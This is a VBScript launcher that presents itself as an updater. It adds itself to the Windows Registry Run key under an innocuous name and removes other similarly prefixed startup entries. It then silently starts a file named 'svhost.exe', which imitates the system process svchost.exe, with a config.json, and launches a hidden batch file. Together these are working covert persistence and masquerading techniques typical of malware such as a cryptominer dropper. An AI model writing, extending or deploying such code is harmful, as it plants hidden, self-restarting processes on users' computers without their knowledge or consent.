Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get paths
scriptPath = WScript.ScriptFullName
scriptName = objFSO.GetFileName(scriptPath)
currentDir = objFSO.GetParentFolderName(scriptPath)

' Registry Run Key path
regRunKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
appKeyName = "tb_run_updater" ' Unique registry value name

' 1. Add itself to the Registry Run key (Generalized using %USERPROFILE% and REG_EXPAND_SZ)
On Error Resume Next
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
generalizedPath = scriptPath
If InStr(1, generalizedPath, userProfile, vbTextCompare) = 1 Then
    generalizedPath = "%USERPROFILE%" & Mid(generalizedPath, Len(userProfile) + 1)
End If

existingVal = objShell.RegRead(regRunKey & appKeyName)
If Err.Number <> 0 Then
    ' Value doesn't exist, create it using REG_EXPAND_SZ so environment variables expand dynamically
    objShell.RegWrite regRunKey & appKeyName, "wscript.exe """ & generalizedPath & """", "REG_EXPAND_SZ"
End If
Err.Clear

' 2. Remove any other entries in the Run key that start with "tb_" (except itself)
Const HKEY_CURRENT_USER = &H80000001
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Dim values, types
oReg.EnumValues HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", values, types

If IsArray(values) Then
    For i = 0 To UBound(values)
        valName = values(i)
        ' Check if it starts with "tb_" (case-insensitive) and is not this script's key name
        If LCase(Left(valName, 3)) = "tb_" And LCase(valName) <> LCase(appKeyName) Then
            oReg.DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", valName
        End If
    Next
End If
On Error GoTo 0

' 3. Switch to the script's directory safely
On Error Resume Next
objShell.CurrentDirectory = currentDir
On Error GoTo 0

' 4. Run svhost.exe quietly if it exists
If objFSO.FileExists(objFSO.BuildPath(currentDir, "svhost.exe")) Then
    objShell.Run """svhost.exe"" -c ""config.json""", 0, False
End If

' 5. Run tb_Updater.bat silently in the background without taskbar icon
batPath = objFSO.BuildPath(currentDir, "tb_Updater.bat")
If objFSO.FileExists(batPath) Then
    ' 0 = Hide window / run completely hidden, False = don't wait for completion
    objShell.Run """" & batPath & """", 0, False
End If
